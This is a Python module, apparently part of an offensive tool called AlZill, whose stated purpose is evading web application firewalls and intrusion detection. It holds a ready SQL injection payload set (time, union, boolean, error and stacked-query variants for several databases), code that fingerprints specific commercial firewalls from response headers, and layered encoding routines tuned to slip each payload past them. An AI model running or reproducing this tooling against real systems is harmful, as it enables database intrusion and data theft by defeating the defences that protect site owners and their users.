#!/usr/bin/env python3
"""
AlZill Advanced Obfuscator Module - Evolution V4
Purpose: Evade WAF/IDS by applying multi-layer encoding and stealth patterns.
Supports: MySQL, PostgreSQL, MSSQL, Oracle bypass techniques
"""

import base64
import urllib.parse
import random
import re
import json
from datetime import datetime

class AlZillObfuscator:

    def __init__(self, *args, **kwargs):
        """Initialize obfuscator engine"""
        self.obfuscation_count = 0
        self.last_payload = None
        
        # Expanded keyword list for SQL injection bypass
        self.sql_keywords = [
            "SELECT", "UNION", "FROM", "WHERE", "DATABASE", "VERSION", 
            "USER", "SLEEP", "SUBSTRING", "ASCII", "BENCHMARK", "ORDER", "GROUP",
            "INFORMATION_SCHEMA", "TABLE_NAME", "COLUMN_NAME", "INSERT", "UPDATE",
            "DELETE", "DROP", "CREATE", "ALTER", "EXEC", "EXECUTE", "DECLARE",
            "WAITFOR", "DELAY", "BENCHMARK", "SLEEP", "PG_SLEEP", "DBMS_LOCK"
        ]
        
        # WAF-specific bypass patterns
        self.waf_bypass_patterns = {
            'Cloudflare': ['/*!50000*/', '/**/', '/*!*/', '/*!12345*/'],
            'Akamai': ['%0a', '%0d', '%00', '%09', '%20'],
            'AWS WAF': ['/*!50000*/', '/**/', '`', '\\', '""', "''"],
            'ModSecurity': ['%0a', '%0d', '/*!*/', '/**/'],
        }

    # ============================================================
    # Core Obfuscation Techniques
    # ============================================================
    
    @staticmethod
    def to_mixed_case(payload):
        """Randomize character casing: e.g., sElEcT"""
        return ''.join(c.upper() if random.choice([True, False]) else c.lower() for c in payload)

    @staticmethod
    def to_inline_comments(payload):
        """Break keywords using SQL inline comments: e.g., UN/**/ION SE/**/LECT"""
        keywords = [
            "SELECT", "UNION", "FROM", "WHERE", "DATABASE", "VERSION", 
            "USER", "SLEEP", "SUBSTRING", "ASCII", "BENCHMARK", "ORDER", "GROUP",
            "INFORMATION_SCHEMA", "TABLE_NAME", "COLUMN_NAME"
        ]
        obfuscated = payload
        for word in keywords:
            if word in obfuscated.upper():
                # Multiple comment injection positions
                positions = [len(word)//3, len(word)//2, 2*len(word)//3]
                for pos in positions:
                    if pos > 0 and pos < len(word):
                        new_word = f"{word[:pos]}/**/{word[pos:]}"
                        obfuscated = re.sub(r'\b' + re.escape(word) + r'\b', new_word, obfuscated, flags=re.IGNORECASE)
                        break
        return obfuscated

    @staticmethod
    def to_no_spaces(payload):
        """Replace spaces with SQL comments or alternative whitespace"""
        alternatives = ['/**/', '%0a', '%0d', '%09', '%20', '/*!*/']
        return payload.replace(" ", random.choice(alternatives))

    @staticmethod
    def to_hex_entities(payload):
        """Convert sensitive characters to Hex (0x...) format"""
        return ''.join(f"0x{ord(c):02x}" if c.isalpha() else c for c in payload)

    @staticmethod
    def to_url_double(payload):
        """Apply double URL encoding to bypass deep inspection filters"""
        return urllib.parse.quote(urllib.parse.quote(payload))

    @staticmethod
    def to_sql_comment_wrap(payload):
        """Wrap payload in MySQL version-specific executable comments"""
        versions = ['50000', '50001', '50002', '50003', '50700']
        return f"/*!{random.choice(versions)}{payload}*/"

    @staticmethod
    def to_random_null_bytes(payload):
        """Inject random null bytes to break WAF patterns"""
        null_byte = '%00'
        positions = random.sample(range(len(payload)), min(3, len(payload)//4))
        result = list(payload)
        for pos in positions:
            result.insert(pos, null_byte)
        return ''.join(result)

    @staticmethod
    def to_unicode_escape(payload):
        """Convert characters to Unicode escape sequences"""
        return ''.join(f'%u{ord(c):04x}' if c.isalnum() else c for c in payload)

    @staticmethod
    def to_concatenation(payload):
        """Break payload into concatenated strings"""
        parts = []
        for i in range(0, len(payload), 2):
            parts.append(f"'{payload[i:i+2]}'")
        return '+'.join(parts)

    @staticmethod
    def to_comment_spread(payload):
        """Spread comments between every character"""
        return '/*!*/'.join(payload)

    # ============================================================
    # Specialized Payloads for WAF Bypass
    # ============================================================
    
    @staticmethod
    def get_stealth_payloads():
        """Generate specialized payloads for different WAF types"""
        return {
            # Time-based bypass
            'time_based': [
                "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)-- -",
                "1' AND SLEEP(5) AND '1'='1",
                "1' WAITFOR DELAY '00:00:05'-- -",
                "1' AND pg_sleep(5)-- -",
                "1' AND DBMS_LOCK.SLEEP(5)-- -",
            ],
            # Union-based bypass
            'union_based': [
                "1' UN/**/ION SEL/**/ECT 1,2,3,4,5-- -",
                "1' /*!50000UNION*/ /*!50000SELECT*/ 1,2,3,4,5-- -",
                "1' UNION SELECT NULL,NULL,NULL-- -",
                "1' UNION SELECT 1,2,3,4,5,6,7,8,9,10-- -",
            ],
            # Boolean-based bypass
            'boolean_based': [
                "1' AND '1'='1' AND '1'='1",
                "1' OR '1'='1' OR '1'='1",
                "1' AND 1=1 AND 1=1-- -",
                "1' OR 1=1 OR 1=1-- -",
            ],
            # Error-based bypass
            'error_based': [
                "1' AND extractvalue(1, concat(0x7e, version()))-- -",
                "1' AND updatexml(1, concat(0x7e, version()), 1)-- -",
                "1' AND 1=CONVERT(int, @@version)-- -",
                "1' AND cast(version() as int)-- -",
            ],
            # Stacked queries bypass
            'stacked': [
                "1'; SELECT SLEEP(5)-- -",
                "1'; SELECT version()-- -",
                "1'; SELECT database()-- -",
                "1'; SELECT user()-- -",
            ],
        }
    
    # ============================================================
    # WAF Detection and Adaptive Obfuscation
    # ============================================================
    
    @staticmethod
    def detect_waf_from_headers(headers):
        """Detect WAF type from response headers"""
        waf_signatures = {
            'Cloudflare': ['cf-ray', 'cf-cache-status', '__cfduid'],
            'Akamai': ['akamai', 'x-akamai', 'ak_bmsc'],
            'AWS WAF': ['x-amzn-requestid', 'aws-waf'],
            'Imperva': ['incapsula', 'x-iinfo'],
            'F5 BIG-IP': ['x-wa-info', 'bigip'],
        }
        
        for waf_name, signatures in waf_signatures.items():
            for sig in signatures:
                if sig in str(headers).lower():
                    return waf_name
        return None
    
    @staticmethod
    def adapt_to_waf(payload, waf_type):
        """Apply WAF-specific bypass techniques"""
        if waf_type not in ['Cloudflare', 'Akamai', 'AWS WAF', 'ModSecurity']:
            return payload
        
        bypass_techniques = {
            'Cloudflare': [
                AlZillObfuscator.to_inline_comments,
                AlZillObfuscator.to_sql_comment_wrap,
                AlZillObfuscator.to_comment_spread,
            ],
            'Akamai': [
                AlZillObfuscator.to_url_double,
                AlZillObfuscator.to_random_null_bytes,
                AlZillObfuscator.to_unicode_escape,
            ],
            'AWS WAF': [
                AlZillObfuscator.to_mixed_case,
                AlZillObfuscator.to_no_spaces,
                AlZillObfuscator.to_hex_entities,
            ],
            'ModSecurity': [
                AlZillObfuscator.to_concatenation,
                AlZillObfuscator.to_comment_spread,
                AlZillObfuscator.to_random_null_bytes,
            ],
        }
        
        techniques = bypass_techniques.get(waf_type, [AlZillObfuscator.to_inline_comments])
        result = payload
        for technique in techniques[:3]:  # Apply up to 3 techniques
            result = technique(result)
        
        return result
    
    # ============================================================
    # Main Obfuscation Engine
    # ============================================================
    
    @staticmethod
    def super_obfuscate(payload, waf_type=None):
        """
        Main Engine: Applies multiple layers of obfuscation for maximum stealth.
        This is the primary method to be called by the AlZill core.
        """
        # Step 1: Apply WAF-specific bypass if WAF type is known
        if waf_type:
            payload = AlZillObfuscator.adapt_to_waf(payload, waf_type)
        
        # Step 2: Break SQL keywords with inline comments
        step1 = AlZillObfuscator.to_inline_comments(payload)
        
        # Step 3: Randomize character casing
        step2 = AlZillObfuscator.to_mixed_case(step1)
        
        # Step 4: Obfuscate whitespace
        step3 = AlZillObfuscator.to_no_spaces(step2)
        
        # Step 5: Random chance to apply additional layers
        if random.choice([True, False]):
            step3 = AlZillObfuscator.to_comment_spread(step3)
        
        if random.choice([True, False]):
            step3 = AlZillObfuscator.to_sql_comment_wrap(step3)
        
        # Step 6: Version-specific comment wrapping (final layer)
        result = AlZillObfuscator.to_sql_comment_wrap(step3)
        
        return result
    
    @staticmethod
    def medium_obfuscate(payload):
        """Medium obfuscation - faster but less stealthy"""
        step1 = AlZillObfuscator.to_inline_comments(payload)
        step2 = AlZillObfuscator.to_mixed_case(step1)
        return AlZillObfuscator.to_no_spaces(step2)
    
    @staticmethod
    def light_obfuscate(payload):
        """Light obfuscation - minimal changes, fastest"""
        return AlZillObfuscator.to_mixed_case(payload)
    
    # ============================================================
    # Payload Generation and Management
    # ============================================================
    
    @staticmethod
    def generate_payloads(base_payload, count=10):
        """Generate multiple obfuscated variants of a payload"""
        variants = []
        techniques = [
            AlZillObfuscator.light_obfuscate,
            AlZillObfuscator.medium_obfuscate,
            AlZillObfuscator.super_obfuscate,
            lambda p: AlZillObfuscator.to_url_double(AlZillObfuscator.to_mixed_case(p)),
            lambda p: AlZillObfuscator.to_hex_entities(AlZillObfuscator.to_no_spaces(p)),
            lambda p: AlZillObfuscator.to_comment_spread(AlZillObfuscator.to_mixed_case(p)),
        ]
        
        for i in range(min(count, len(techniques) * 2)):
            technique = random.choice(techniques)
            variant = technique(base_payload)
            variants.append(variant)
        
        return list(set(variants))[:count]
    
    @staticmethod
    def get_all_variants(payload):
        """Generate all possible obfuscation variants for testing"""
        return {
            'plain': payload,
            'light': AlZillObfuscator.light_obfuscate(payload),
            'medium': AlZillObfuscator.medium_obfuscate(payload),
            'super': AlZillObfuscator.super_obfuscate(payload),
            'double_url': AlZillObfuscator.to_url_double(payload),
            'mixed': AlZillObfuscator.to_mixed_case(payload),
            'no_spaces': AlZillObfuscator.to_no_spaces(payload),
            'inline_comments': AlZillObfuscator.to_inline_comments(payload),
            'hex': payload.encode().hex(),
            'unicode': AlZillObfuscator.to_unicode_escape(payload),
            'concatenated': AlZillObfuscator.to_concatenation(payload),
            'comment_spread': AlZillObfuscator.to_comment_spread(payload),
        }
    
    @staticmethod
    def save_obfuscation_report(payload, results):
        """Save obfuscation test results to file"""
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"obfuscation_report_{timestamp}.json"
        
        report = {
            'timestamp': timestamp,
            'original_payload': payload,
            'variants_tested': len(results),
            'successful_bypass': results.get('successful', []),
            'failed_bypass': results.get('failed', []),
        }
        
        with open(filename, 'w') as f:
            json.dump(report, f, indent=2)
        
        return filename


# ============================================================
# Legacy functions for backward compatibility
# ============================================================

def to_base64(payload):
    """Legacy function - convert payload to Base64"""
    return base64.b64encode(payload.encode()).decode()

def to_hex(payload):
    """Legacy function - convert payload to Hex encoding"""
    return payload.encode().hex()

def to_url_encode(payload):
    """Legacy function - URL encode payload"""
    return urllib.parse.quote(payload)

def to_double_url_encode(payload):
    """Legacy function - Double URL encode payload"""
    return urllib.parse.quote(urllib.parse.quote(payload))

def to_unicode(payload):
    """Legacy function - convert to unicode escapes"""
    return ''.join(f'\\u{ord(c):04x}' for c in payload)

def to_mixed_case(payload):
    """Legacy function - randomly change case of letters"""
    return AlZillObfuscator.to_mixed_case(payload)

def to_sql_comment(payload):
    """Legacy function - add SQL comments"""
    return f"/*!{payload}*/"

def get_all_variants(payload):
    """Legacy function - get all variants"""
    return AlZillObfuscator.get_all_variants(payload)

def super_obfuscate(payload):
    """Legacy function - super obfuscation"""
    return AlZillObfuscator.super_obfuscate(payload)


# ============================================================
# Standalone Test
# ============================================================
if __name__ == "__main__":
    test_payloads = [
        "1' UNION SELECT database(),2,3,4,5,6,7,8,9,10-- -",
        "1' AND SLEEP(5) AND '1'='1",
        "1' AND extractvalue(1, concat(0x7e, version()))-- -",
    ]
    
    print("="*60)
    print("AlZill Obfuscator Module Test")
    print("="*60)
    
    for payload in test_payloads:
        print(f"\n[+] Original: {payload[:60]}...")
        
        obfuscated = AlZillObfuscator.super_obfuscate(payload)
        print(f"[+] Obfuscated: {obfuscated[:80]}...")
        
        variants = AlZillObfuscator.get_all_variants(payload)
        print(f"[+] Variants generated: {len(variants)}")
    
    print("\n" + "="*60)
    print("[✓] Obfuscator module ready")
    print("="*60)
